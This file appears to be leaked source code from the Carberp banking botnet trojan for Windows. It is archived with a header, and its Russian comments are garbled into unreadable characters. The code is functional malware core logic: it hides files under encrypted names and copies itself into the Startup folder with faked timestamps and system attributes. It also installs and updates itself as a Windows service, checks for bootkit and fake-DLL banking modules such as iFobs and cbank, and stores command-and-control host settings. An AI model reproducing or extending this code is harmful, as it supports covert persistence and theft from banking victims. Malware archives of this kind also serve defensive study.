/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------
#include <shlobj.h>

#include "BotCore.h"
#include "BotUtils.h"
#include "HTTPConsts.h"
#include "BotDef.h"
#include "BotHosts.h"
#include "StrConsts.h"
#include "Pipes.h"


//#include "DbgRpt.h"


//---------------------------------------------------------------------------
#include "BotDebug.h"

namespace COREDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define COREDBG COREDEBUGSTRINGS::DBGOutMessage<>

//---------------------------------------------------------------------------


//���� ���������� bot.plug, �� ������� ��� �������� � ���������� ��������� � ����� main.cpp ��� �������
//��� ��������� �������� ����� �������� �� �����
#ifdef BOTPLUG
	extern bool FakeDllDelete();
	bool UpdateBotFakeDll( BYTE* data, int c_data );
	bool UpdateBotBootkit( BYTE* data, int c_data );
#endif




struct TBotData
{
	TProcessType ProcessType;  // ��� ����������� ��������

	string  BotPath;     // ������� ����
	string  WorkPath;
	string  BotExeName;  // ������ ��� ��� ����
	//string  BotShortLinkName; // ��� ����� ������

    // ������ ��� ������ �������
	string                ServiceName;
	SERVICE_TABLE_ENTRYA  ServiceTable[1];
	SERVICE_STATUS        ServiceStatus;
	SERVICE_STATUS_HANDLE ServiceStatusHandle;
};



//---------------------------------------------------------------------------

TBotApplication* Bot = NULL;
TBotData* BotData = NULL;


//
// ��� ����. ��������������� ������� �� ���� ����� ��������
//
TBotType BotType = BotRing3;


//--------------------------------------------
// ������ ���� ������, ������� �����
// ������� ���
//--------------------------------------------
DWORD BOT_HIDDEN_FILES[MAX_HIDDEN_FILES + 1] = {0};


//---------------------------------------------------------------------------

// ������������ ������ ������� ������������ �����
#define MAX_CRYPTED_EXE_NAME_SIZE 50


// ����������� ��� ������������ ����� ����
char CryptedBotExeName[MAX_CRYPTED_EXE_NAME_SIZE] = {0};


DWORD BotExeNameHash        = 0; // ��� ����� ����
DWORD BotServiceExeNameHash = 0; // ��� ����� ������� ����

//��� ����, ���������������� � ������� BOT::Initialize(), ����� �������� ���� ����� ������� ������� 
//����� ������� SetBankingMode()
char BOT_UID[128];




//���������� ������ ������������ ��� BOT
namespace BOT
{
	//string MakeWorkPath();   // ������� ���������� ������ ������� ����
	string MakePath(const char* SubDirectory); // ������� ���������� ��� ���� � ������� ��������
}



//-------------------------------------------
// ������� �������� ���� � ��������� ��������������
// �����:
// ������� �� ������������ ��������� �������������.
// ��� ����������� ������������, ��� ���������� ���������
//-------------------------------------------
string BOT::MakePath(const char* SubDirectory)
{
	string Path = BOT::WorkPath();

	if (!STRA::IsEmpty(SubDirectory))
	{
		if (SubDirectory[0] == SlashChar)
			SubDirectory++;

		string Temp = SubDirectory;

		if (Temp[Temp.Length() - 1] == SlashChar)
			Temp[Temp.Length() - 1] = 0;

		PCHAR SD = UIDCrypt::CryptFileName(Temp.t_str(), false);

		Path += SD;
		Path += Slash;

		STR::Free(SD);

		if (!DirExists(Path.t_str()))
			pCreateDirectoryA(Path.t_str(), NULL);
    }
	return Path;
}

//----------------------------------------------------------------------------



//-------------------------------------------
// WorkPath - ������� ���������� ������ ����
//            �������� �������� ����
//-------------------------------------------
string BOT::WorkPath()
{
	// ���� � �������� �������� ����, ��������  � �������� ������������
	if (BotData->WorkPath.IsEmpty())
		BotData->WorkPath = MakeWorkPath();
	return BotData->WorkPath;
}


//-------------------------------------------
// MakeFileName - ������� ���������� ��� ����
//                ����� ������������� � �����
//                ��������� �����
//-------------------------------------------
string BOT::MakeFileName(const char* SubDir, const char* FileName)
{
	// ������� �������� ��� ����� � ������� ����� ����
	string Name = MakePath(SubDir);

	// ������� ��� �����
	if (!STRA::IsEmpty(FileName))
	{
		PCHAR Tmp = UIDCrypt::CryptFileName(FileName, false);
		Name += Tmp;
		STR::Free(Tmp);
    }

	return Name;
}

string BOT::MakeFileName(const string &SubDir, const string &FileName)
{
	return MakeFileName(SubDir.t_str(), FileName.t_str());
}






//****************************************************************************
//                              TBotApplication
//****************************************************************************

TBotApplication::TBotApplication()
{
	// �������������� ���������� ������
	Bot = this;


	// �������������� ���������� ��������� ����
	FTerminated = false;

	// ���������� PID ��������
	FPID = GetUniquePID();

	// ���������� ��� �������� � ������� �������� ���
	TMemory Buf(MAX_PATH);
	pGetModuleFileNameA(NULL, Buf.Buf(), MAX_PATH);
	FApplicationName = Buf.AsStr();
	FApplicationName.LowerCase();

	// �������� ������������� ����
	FUID = GenerateBotID2();
}
//-------------------------------------------------------------


TBotApplication::~TBotApplication()
{

}
//-------------------------------------------------------------

DWORD TBotApplication::PID()
{
	// ������� ���������� ������������� �������� � ������� �������� ���
	return FPID;
}
//-------------------------------------------------------------

string TBotApplication::UID()
{
	return FUID;
}
//-------------------------------------------------------------

string TBotApplication::ApplicationName()
{
	// ��� ���������� � ������� �������� ���
	return FApplicationName;
}
//-------------------------------------------------------------

//-------------------------------------------------------------

string TBotApplication::CreateFile(const char* SubDir, const char* FileName)
{
	string Name = BOT::MakeFileName(SubDir, FileName);
	File::WriteBufferA(Name.t_str(), NULL, 0);
	return Name;
}

string TBotApplication::CreateFile(const string &SubDir, const char* FileName)
{
	return CreateFile(SubDir.t_str(), FileName);
}


//-------------------------------------------------------------


bool TBotApplication::FileExists(const char* SubDir, const char* FileName)
{
	// ������� ��������� ������� ����� � ������� ����� ����
	string Name = BOT::MakeFileName(SubDir, FileName);
	return File::IsExists(Name.t_str());
}

bool TBotApplication::FileExists(const string &SubDir, const char* FileName)
{
	return FileExists(SubDir.t_str(), FileName);
}
//-------------------------------------------------------------

string TBotApplication::GrabberPath()
{
	// ���� � �������� �������� ������� ������
	if (FGrabberPath.IsEmpty())
		FGrabberPath = BOT::MakePath(GetStr(StrGrabberPath).t_str());
	return FGrabberPath;
}
//-------------------------------------------------------------

string TBotApplication::PrefixFileName()
{
	// ������� ���������� ��� ����� ��� �������� ��������
	if (FPerfixFileName.IsEmpty())
		FPerfixFileName = BOT::MakeFileName(NULL, GetStr(EStrPrefixFileName).t_str());

	return FPerfixFileName;
}
//----------------------------------------------------------------------------




PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
{
	// ������� ���������� ������� ������� ����

	string Path = BOT::WorkPath();

	if (Path.IsEmpty()) return NULL;

	// ��������� ������������
	if (!STR::IsEmpty(SubDir))
	{
        PCHAR CryptDir = UIDCrypt::CryptFileName(SubDir, false);

		Path += CryptDir;

		STR::Free(CryptDir);

		if (!DirExists(Path.t_str()))
			pCreateDirectoryA(Path.t_str(), NULL);

    }

	PCHAR Result = STR::New(2, Path.t_str(), FileName);

	return  Result;
}

//----------------------------------------------------------------------------




//**************************************************************************
//  ���������� ������ ���� ����
//**************************************************************************
namespace BOT
{



	//--------------------------------------------------
	//  ExecuteDeleteBot - ������� ��������� ������� ��
	//				       �������� ����
	//--------------------------------------------------
	void WINAPI ExecuteDeleteBot(LPVOID, PPipeMessage, bool &Cancel)
	{
		COREDBG("CORE", "�������� ������� �� �������� ����");

		string FileName;

		switch (BotData->ProcessType)
		{

			case ProcessLoader:
			{
				// ��������� �������� �� �������� �������
				FileName = BOT::GetBotFullExeName();

				// ������� ������ � ����
                Unprotect();

                break;
            }
		}

		COREDBG("CORE", "������� ���� %s", FileName);
		DeleteBotFile(FileName.t_str());

		Cancel = true;
    }

	//������� ���� (����) ����
	bool DeleteBotFile( const char* FileName, DWORD TimeOut, bool DeleteAfterReboot )
	{
		// ������� ����
		if (!pSetFileAttributesA(FileName, FILE_ATTRIBUTE_NORMAL ))
		{
			DWORD Err = pGetLastError();
			// ���� ���� �� ��������� �������� ������
			if (Err == ERROR_FILE_NOT_FOUND)
				return true;
		}

		DWORD Start = (DWORD)pGetTickCount();
		BOOL Deleted = FALSE;
		do
		{
			Deleted = (BOOL)pDeleteFileA(FileName);
			if (!Deleted && TimeOut)
			{
				// � ������ ���� ������ ������� �� ���������������� ����������
				// � �������� ��� ��� �������
				DWORD Interval = (DWORD)pGetTickCount() - Start;
				if (Interval <= TimeOut)
					pSleep(250);
				else
					break;
			}
		}
		while (!Deleted && TimeOut);


		if (!Deleted && DeleteAfterReboot)
		{
			// �� ������� �� ������ ������� ����.
			// ������� ���� ����� ������������
			Deleted = (BOOL)pMoveFileExA(FileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
		}

		return Deleted != FALSE;
	}
    //----------------------------------------------------------------------



	//--------------------------------------------------
	//  GetProcessPipeName - ������� ���������� ���
	//  ���������� ����� ��������
	//--------------------------------------------------
	string GetProcessPipeName(TProcessType Process)
	{
		string Name;

		switch (Process) {
			case ProcessLoader: Name = GetStr(EStrPipeLoader); break;
		}

        return Name;
	}
	//----------------------------------------------------------------------

	//--------------------------------------------------
	//  CreateProcessPipe - ������� ������ ���������
	//                      ����� ��������
	//--------------------------------------------------
	void CreateProcessPipe(TProcessType Process)
	{
		string Name = GetProcessPipeName(Process);
		if (Name.IsEmpty()) return;

		PProcessPipe P = PIPE::CreateProcessPipe(Name, false);
		if (P)
		{
			// ����� �������� ������� ������, ��������� ����������� �������
			if (Process == ProcessLoader || Process == ProcessService)
			{
				// ������������ ������� �������� ����
                PIPE::RegisterMessageHandler(P, ExecuteDeleteBot, NULL, NULL, GetStr(EStrProcessCommandDeleteBot).Hash());
            }
		}

		PIPE::StartProcessPipe(P);
	}
	//----------------------------------------------------------------------


	//--------------------------------------------------
	//  ServiceControlHandler - ������� ����������
	//                          ��������
	//--------------------------------------------------
	void WINAPI ServiceControlHandler(DWORD Request)
	{
		if (Request == SERVICE_CONTROL_STOP || Request == SERVICE_CONTROL_SHUTDOWN)
		{
			COREDBG("BotService", "�������� ������� ��������� �������");
			BotData->ServiceStatus.dwWin32ExitCode = 0;
			BotData->ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
			pSetServiceStatus(BotData->ServiceStatusHandle, &BotData->ServiceStatus);
			return;
        }


		pSetServiceStatus (BotData->ServiceStatusHandle, &BotData->ServiceStatus);
	}

	//--------------------------------------------------
	//  ServiceMain - ������� ������� ������� ����
	//--------------------------------------------------
#ifdef INSTALL_BOT_AS_SERVICE

	void WINAPI ServiceMain(DWORD argc, char** argv)
	{
		// �������������� ������ �������
		COREDBG("BotService", "�������� �������� ������ �������");
		BotData->ServiceStatus.dwServiceType       = BOT_SERVICE_TYPE;
		BotData->ServiceStatus.dwCurrentState      = SERVICE_START_PENDING;
		BotData->ServiceStatus.dwControlsAccepted  = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
		BotData->ServiceStatus.dwWin32ExitCode     = 0;
		BotData->ServiceStatus.dwServiceSpecificExitCode = 0;
		BotData->ServiceStatus.dwCheckPoint        = 0;
		BotData->ServiceStatus.dwWaitHint          = 0;

        // ������������ ���������� ������ �������
		BotData->ServiceStatusHandle = (SERVICE_STATUS_HANDLE)pRegisterServiceCtrlHandlerA(BotData->ServiceName.t_str(), ServiceControlHandler);
		if (BotData->ServiceStatusHandle == (SERVICE_STATUS_HANDLE)0)
		{
			// �� ������� ���������������� ��������� ������ �������
			COREDBG("BotService", "������ ����������� ����������� ������ ���������� ��������");
			return;
		}

		BotData->ServiceStatus.dwCurrentState = SERVICE_RUNNING;
		pSetServiceStatus (BotData->ServiceStatusHandle, &BotData->ServiceStatus);

		// ��������� ����������� ���� �������� ���������� ������ �������
		while (BotData->ServiceStatus.dwCurrentState == SERVICE_RUNNING)
		{
			pSleep(500);
		}

		BotData->ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		pSetServiceStatus (BotData->ServiceStatusHandle, &BotData->ServiceStatus);

	}
	//----------------------------------------------------------------------
#endif


	//--------------------------------------------------
	//  CheckIsService - ������� ��������� �������� ��
	//                   ������� ��������
	//--------------------------------------------------
	bool CheckIsService()
	{

		DWORD Hash1 = Bot->ApplicationName().Hash(0, true);
		DWORD Hash2 = GetServiceFullExeName().Hash(0, true);
		return Hash1 == Hash2;
	}

}
//**************************************************************************









void BOT::Initialize(TProcessType ProcessType)
{
	// ������� �������������� ���������� ��������� ����

	// �������������� ���
	InitializeAPI();

	//������ ���������� ������� ����
	BotData = CreateStruct(TBotData);

	Bot     = new TBotApplication();


	// ������������� ���������� ������ ����
	// ����� ���������� ���� �������� �������� ��
	// �������� �� ������� ��������
	BotData->ProcessType = (CheckIsService()) ? ProcessService : ProcessType;

	// ������ ��� ������� �����
	WorkPath();

	// ������ ��� ���
	GetBotExeName();

	GenerateUid(BOT_UID);

	// �������� �������� ����� ��� ����������
	// �������� ������ � ������ ������, ��� ���� ��� ����������� �����������
	// ������ �� �������� ������������� ��������� VEH.
	//InitialializeGlogalExceptionLogger(TRUE);


	CreateProcessPipe(ProcessType);
}

void BOT::InitializeApi()
{
	// �������������� ���
	InitializeAPI();
}
//----------------------------------------------------------------------------

//----------------------------------------------------
//  ������� ������ ������ ���� ��������� �������
//  ������� ������ ����. ������������� ��� ��������
//  ������� ����.
//
//  � ������ ������ �������-��������
//----------------------------------------------------
bool BOT::Terminated() 
{ 
	return false; 
}


//----------------------------------------------------
// GetBotPath - ��� �������� �������� ����
//              � ���� �������� ����� ������ �����
//              ������ ����� ����.
//  ��� �����������, ��������� � ������ ������
//  ������������ GetWorkPath()
//----------------------------------------------------
string BOT::GetBotPath()
{
	if (BotData->BotPath.IsEmpty())
    	BotData->BotPath = MakeBotPath();
	return BotData->BotPath;
}
//----------------------------------------------------------------------------

PCHAR BOT::GetWorkPath(PCHAR SubDir, PCHAR FileName)
{
	//  ������� ���������� ������� ���� ����
    return BOTDoGetWorkPath(false, SubDir, FileName);
}
//----------------------------------------------------------------------------

//PCHAR BOT::GetWorkPathInSysDrive(PCHAR SubDir, PCHAR FileName)
//{
//	//  ������ ������� GetWorkPath.
//	//  ������� �� ����� �� �� � ���, ��� �����
//	//   �������� � ����� ���������� �����
//    return BOTDoGetWorkPath(true, SubDir, FileName);
//}

//----------------------------------------------------------------------------

PCHAR BOT::GetBotExeName()
{
	//  ������� ���������� ��� ����� ����

	// ��� ������������� ���������� ��� ����
	if (STR::IsEmpty(CryptedBotExeName))
	{
		// ��� 32 ���������� ���� ����������� �� 64 ���������
		// ����� ��� ����� ����� ����������� � �����������
		// ��� ����� ���-�� �������������

		#ifdef _WIN64
			bool UseStaticName = false;
		#else
			bool UseStaticName = IsWIN64();
		#endif

		string Exe = GetStr(EStrOriginalBotExeName);

		// ������ ������������ ���
		if (!UseStaticName)
		{
			PCHAR Name = UIDCrypt::CryptFileName(Exe.t_str(), false);
			Exe = Name;
			STR::Free(Name);
        }

		DWORD Max = MAX_CRYPTED_EXE_NAME_SIZE - 5;
		if (Exe.Length() > Max)
			Exe.SetLength(Max);

		Exe += ".exe";

		STR::Copy(Exe.t_str(), CryptedBotExeName, 0, Exe.Length() + 1);

		// ����������� ��� �����
		BotExeNameHash = STRA::Hash(CryptedBotExeName);

		// ��������� ��� � ������ ���������� �����
		AddHiddenFile(BotExeNameHash);

		//GetBotLinkName(); // ��������� ��� ������ � ������ ���������� ������
	}


	return CryptedBotExeName;
}
//----------------------------------------------------------------------------

//----------------------------------------------------
//  GetBotLinkName - ������� ���������� ��� �����
//     				 ������ ����
//----------------------------------------------------
//string BOT::GetBotLinkName()
//{
//	if (BotData->BotShortLinkName.IsEmpty())
//	{
//		PCHAR Link = UIDCrypt::CryptFileName(GetStr(EStrBotStartupLinkName).t_str(), false);
//		BotData->BotShortLinkName = Link;
//		AddHiddenFile(Link);
//		STR::Free(Link);
//    }
//	return BotData->BotShortLinkName;
//}

//----------------------------------------------------------------------------

DWORD BOT::GetBotExeNameHash()
{
	//  ������� ���������� ��� ��� ����� ����
    GetBotExeName();
    return BotExeNameHash;
}
//----------------------------------------------------------------------------

string BOT::GetBotFullExeName()
{
	if (BotData->BotExeName.IsEmpty())
	{
		BotData->BotExeName = GetSpecialFolderPathA(CSIDL_STARTUP, GetBotExeName());
	}
    return BotData->BotExeName;
}
//----------------------------------------------------------------------------

//----------------------------------------------------
//  GetServiceFullExeName - ������� ���������� ������
//						    ��� ����� ������� ����
//----------------------------------------------------
string BOT::GetServiceFullExeName()
{
	// ������ ��� ��� ����� �������
	string Path = GetSpecialFolderPathA(CSIDL_SYSTEM, GetStr(EStrBotServiceExePath).t_str());

	if (!DirExists(Path.t_str()))
		pCreateDirectoryA(Path.t_str(), NULL);

	Path += GetStr(EStrBotServiceExeName);

	return Path;
}
//----------------------------------------------------------------------------



HANDLE BotFileHandle = NULL;
HANDLE BotMapHandle = NULL;


void BOT::Protect(PCHAR FileName)
{
	// ������� �������� ��� ���� �� ��������
	string Name = FileName;

	if (Name.IsEmpty())
		Name = GetBotFullExeName();

	if (Name.IsEmpty())
    	return;

	// ��������� ����
	BotFileHandle = (HANDLE)pCreateFileA(Name.t_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );


	if (BotFileHandle != INVALID_HANDLE_VALUE)
	{
		BotMapHandle = (HANDLE)pCreateFileMappingA(Name.t_str(), NULL, PAGE_READONLY, 0, 0, NULL );
	}
}

//----------------------------------------------------------------------------

void BOT::Unprotect()
{
	// ������� ������� ������ � ��� ����� ����
	pCloseHandle(BotFileHandle);
	pCloseHandle(BotMapHandle);

	BotFileHandle = NULL;
	BotMapHandle = NULL;
}
//----------------------------------------------------------------------------


bool BOT::AddToAutoRun(PCHAR FileName)
{
	// ������� ��������� ���� � ������������

	if (!FileExistsA(FileName))
		return false;

	string BotFile = GetBotFullExeName();

	if (StrSame(FileName, BotFile.t_str(), false, 0))
		return 0;

	COREDBG("Core", "��������� ��� � ������������. FileName = %s", BotFile.t_str());

    // ������� ��������� ��������
	pSetFileAttributesA(BotFile.t_str(), FILE_ATTRIBUTE_NORMAL);

	// �������� ����
	bool Result = (BOOL)pCopyFileA(FileName, BotFile.t_str(), TRUE) == TRUE;

	// ������������� ���� �����
	SetFakeFileDateTime(BotFile.t_str());

	pSetFileAttributesA(BotFile.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );

	// ������� �������� ����
	if (Result)
		pDeleteFileA(FileName);

	return Result;
}


//----------------------------------------------------
// InstallService - ������� ����������� ��� ����
//                  ��� ������
// FileName - ��� ��� ����� ����
//----------------------------------------------------
bool BOT::InstallService(const char* FileName)
{
#ifdef INSTALL_BOT_AS_SERVICE

	if (!FileExistsA((PCHAR)FileName))
		return false;

	string FN = GetServiceFullExeName();
	if (FN.IsEmpty() || File::IsExists(FN.t_str())) 
		return false;

    COREDBG("BotCore", "������������� ������ ����");
	// �������� ���� � ��������� ����������

	COREDBG("BotCore", "������ EXE ���� %s", FN.t_str());
    bool Result = (BOOL)pCopyFileA(FileName, FN.t_str(), FALSE) != FALSE;
	if (Result)
	{
		pSetFileAttributesA(FN.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );

		// ���� ����������, ����������� ������
		TService Service;
		Service.Name        = GetStr(EStrServiceName);
		Service.DisplayName = Service.Name;

		COREDBG("BotCore", "������ ������ %s", Service.Name.t_str());

		Result = Service.Install(FN.t_str());
		if (Result)
			Result = Service.Start();
		if (Result)
			COREDBG("BotCore", "������ ������� ������ � �������");
		else
			COREDBG("BotCore", "������ �������� � ������� ������� %d", pGetLastError());

		if (!Result)
		{
			COREDBG("BotCore", "�� ������� ��������� ������. ������ %d", pGetLastError());
		}
	}
	return Result;

#else

	return false;

#endif
}

//----------------------------------------------------
// UpdateService - ������� ��������� ��� �������
//----------------------------------------------------
bool BOT::UpdateService(const char* FileName)
{
#ifdef INSTALL_BOT_AS_SERVICE
	if (!File::IsExists((PCHAR)FileName))
		return false;
		
	string FN = GetServiceFullExeName();
	if (FN.IsEmpty()) 
		return false;
		
	COREDBG("BotCore", "��������� ��� ������� %s", FN.t_str());
	TService Service;
	Service.Name = GetStr(EStrServiceName);
	
	// ������������� ������
	BOOL Result = Service.Stop(30000);
	COREDBG("BotCore", "������������� ������. ���������=%d [Err:%d]", Result, pGetLastError());

	// �������� ����
	Result = DeleteBotFile(FN.t_str(), 30000, false);
	COREDBG("BotCore", "������� ���� �������. ���������=%d [Err:%d]", Result, pGetLastError());
	
	Result = (BOOL)pCopyFileA(FileName, FN.t_str(), FALSE);
    COREDBG("BotCore", "�������� ���� �������. ���������=%d [Err:%d]", Result, pGetLastError());
	
	pSetFileAttributesA(FN.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );

	// ��������� ������
	Service.Close();
	Result = Service.Start();
	COREDBG("BotCore", "�������� ������. ���������=%d [Err:%d]", Result, pGetLastError());
	
	return Result != 0;
#else
	return false;
#endif
}


//----------------------------------------------------
// UninstallService - ������� �������������
//                    ������ ����
//----------------------------------------------------

bool BOT::UninstallService()
{
	bool Result = false;

#ifdef BotServiceH

	COREDBG("BotCore", "������������� ������");

	TService Service;
	Service.Name = GetStr(EStrServiceName);

	Result = Service.Uninstall();
	if (Result)
	{
		// ������ ����
		string ExeName = GetServiceFullExeName();
		COREDBG("BotCore", "������ ��������������. ������� ��� %s", ExeName.t_str());
		Result = DeleteBotFile(ExeName.t_str(), 30000, false);

	}
	if (Result)
		COREDBG("BotCore", "������ ������� ��������������");
	else
		COREDBG("BotCore", "������ ������������ �������. ������ %d", pGetLastError());
#endif
	return Result;
}




//----------------------------------------------------
// ExecuteService - ������� ��������� ����������
//                  �������
//----------------------------------------------------
#ifdef INSTALL_BOT_AS_SERVICE
	void BOT::ExecuteService()
	{
		BotData->ServiceName = GetStr(EStrServiceName);

		COREDBG("BotService", "������� ������ ���� %s", BotData->ServiceName.t_str());

		BotData->ServiceTable[0].lpServiceName = BotData->ServiceName.t_str();
		BotData->ServiceTable[0].lpServiceProc = ServiceMain;

		pStartServiceCtrlDispatcherA(BotData->ServiceTable);
		COREDBG("BotService", "������ �������� ������");
		pExitProcess(0);
	}
#endif


//----------------------------------------------------
// IsService - ������� ���������� ������ ����
//             ������� ������� �������� ��������
//----------------------------------------------------
bool BOT::IsService()
{
	return BotData->ProcessType == ProcessService;
}



//----------------------------------------------------
//  TryCreatBotInstance - ������� ���������� 
//  ����� ��������, ��������� �������� �������� ��������
//  ��� ���� ��������� ������� ������.
//----------------------------------------------------
HANDLE BOT::TryCreateBotInstance()
{
	return TryCreateSingleInstance(GetStr(StrBotGlobalMutexName).t_str());
}

//������� ������� ��� �������, ���� ���������� 0, �� ������ ��� ���-�� ��� ������ 
HANDLE BOT::CreateBootkitMutex()
{
	return TryCreateSingleInstance(GetStr(StrBootkitIsRunMutex).t_str());
}

//���������� true, ���� ������� ��� �� ��� �������
bool BOT::BootkitIsRun()
{
	HANDLE m = BOT::CreateBootkitMutex();
	if( m == 0 ) return true;
	pCloseHandle(m);
	return false;
}

//----------------------------------------------------
//  IsRunning - ������� ���������� ������ ���� �
//  ������� ��� ������� ��������� ����
//----------------------------------------------------
bool BOT::IsRunning()
{
	HANDLE H = TryCreateBotInstance();
	bool Result = (H == 0);
	if (H) pCloseHandle(H);
	return Result;
}

//----------------------------------------------------
//  SendProcessMessage - ������� ���������� ���������
//  ���������� ��������
//----------------------------------------------------
bool BOT::SendProcessMessage(TProcessType Process, const string &Message)
{
	return PIPE::SendMessage(GetProcessPipeName(Process), Message);
}


//----------------------------------------------------
//  Delete - ������� ������� ��� ����
//----------------------------------------------------
void BOT::Delete()
{
	bool deleted = false;
	switch( BOT::GetBotType() )
	{

		case BotFakeDll:
			{
				#ifdef BOTPLUG
					deleted = FakeDllDelete();
				#endif
				break;
			}

	}

	if( !deleted )
	{
		if (BotData->ProcessType == ProcessLoader || BotData->ProcessType == ProcessService)
		{
			bool C; // ��� ������������ ������
			ExecuteDeleteBot(NULL, NULL, C);
		}
		else
		{
			//  ����� ���������� �� ������� ��������,
			//  ���������� ������� �� ��������
			string Cmd = GetStr(EStrProcessCommandDeleteBot);

			SendProcessMessage(ProcessLoader,  Cmd);
			SendProcessMessage(ProcessService, Cmd);
		}
	}
}

void BOT::DeleteAutorunBot()
{
	DeleteBotFile(BOT::GetBotFullExeName().t_str());
}
//----------------------------------------------------------------------------


PCHAR BOT::GetHostsFileName()
{
	// ������� ���������� ��� ����� ��������� ������ ������ ����
	return BOT::GetWorkPath(NULL, GetStr(EStrHostsFileName).t_str());
 }
//---------------------------------------------------------------------------



void BOT::SaveSettings(bool SavePrefix, bool SaveHosts, bool IgnoreIfExists)
{
	// ������� ��������� ������� ���������

	// ��������� �����
	if (SaveHosts)
	{
		PCHAR HostsName = GetHostsFileName();
		if (!IgnoreIfExists || !FileExistsA(HostsName))
			SaveHostsToFile(HostsName);
		STR::Free(HostsName);
    }

	// ��������� �������
	if (SavePrefix)
	{
		string PrefixFile = Bot->PrefixFileName();
		if (!IgnoreIfExists || !FileExistsA(PrefixFile.t_str()))
			SavePrefixToFile(PrefixFile.t_str());
    }
}
//----------------------------------------------------------------------------

void BOT::DeleteSettings()
{
	// ������� ������� ����� ����������� ���������
	// ������� �����
	PCHAR HostsName = BOT::GetHostsFileName();
	pDeleteFileA(HostsName);
	STR::Free(HostsName);

	// ������� ���� ��������
	pDeleteFileA(Bot->PrefixFileName().t_str());
}

//----------------------------------------------------------------------------


//----------------------------------------------------
// ������� ��������� ������� ���� �� ��������� ����
//----------------------------------------------------
void BOT::SavePrefixToTemporaryFile()
{
	string FileName = MakeFileName(NULL, GetStr(EStrTemporaryPrefixFileName).t_str());
	SavePrefixToFile(FileName.t_str());
}
//----------------------------------------------------------------------------

//----------------------------------------------------
// ������� ��������� ������� ���� �� ���������� �����
// ��������� ��� � ������� ���� � ������� ���������
//----------------------------------------------------
void BOT::SavePrefixFromTemporaryFile(bool IgnoreIfExists)
{
	string TempName   = MakeFileName(NULL, GetStr(EStrTemporaryPrefixFileName).t_str());
	if (File::IsExists(TempName.t_str()))
	{
		
		//if (!IgnoreIfExists || !File::IsExists(PrefixFile.t_str()))
		{
			DWORD Size = 0;
			LPBYTE Prefix = File::ReadToBufferA(TempName.t_str(), Size);
			if (Prefix && Size)
			{
				string PrefixFile = Bot->PrefixFileName();
				File::WriteBufferA(PrefixFile.t_str(), Prefix, Size);
			}
			MemFree(Prefix);
        }
		pDeleteFileA(TempName.t_str());
    }
}



//----------------------------------------------------
//  ������� ���������/��������� ���� ����
//----------------------------------------------------
void BOT::SetBotType(TBotType Type)
{
    BotType = Type;
}

TBotType BOT::GetBotType()
{
	return BotType;
}

//----------------------------------------------------
//  ������� ��� ����������� �������� ��������� ������
//----------------------------------------------------

void BOT::AddHiddenFile(DWORD Hash)
{
	// ��������� ��� � ������ ���������� ������
	if (!Hash) return;

	for (int i = 0; i < MAX_HIDDEN_FILES; i++)
	{
		if (BOT_HIDDEN_FILES[i] == Hash) break;
		else
		if (BOT_HIDDEN_FILES[i] == 0)
		{
			BOT_HIDDEN_FILES[i] = Hash;
			BOT_HIDDEN_FILES[i + 1] = 0;
			break;
		}
	}
}

void BOT::AddHiddenFile(const char* FileName)
{
	AddHiddenFile(STRA::Hash(FileName));
}


bool BOT::IsHiddenFile(DWORD FileHash)
{
	// ������� ���������� ������ ���� ��������� ���� ���������� ��������
	for (int i = 0; i < MAX_HIDDEN_FILES, BOT_HIDDEN_FILES[i] != 0 ; i++)
	{
		if (BOT_HIDDEN_FILES[i] == FileHash)
			return true;
	}
	return false;
}


bool BOT::IsHiddenFile(const char* FileName)
{
	return IsHiddenFile(STRA::Hash(FileName));
}

//���������� true, ���� ������� �����������
bool BOT::FakeDllInstalled()
{
	return Bot->FileExists( 0, GetStr(EStrFakeDllFlag).t_str() );
}

//���������� true, ���� ����������� ������� � ����� �����
bool BOT::FakeDllIFobsInstalled()
{
	return Bot->FileExists( 0, GetStr(EStrFakeDllIFobsFlag).t_str() );
}

//���������� true, ���� ����������� ������� � ����� cbank
bool BOT::FakeDllCBankInstalled()
{
	return Bot->FileExists( 0, GetStr(EStrFakeDllCBankFlag).t_str() );
}
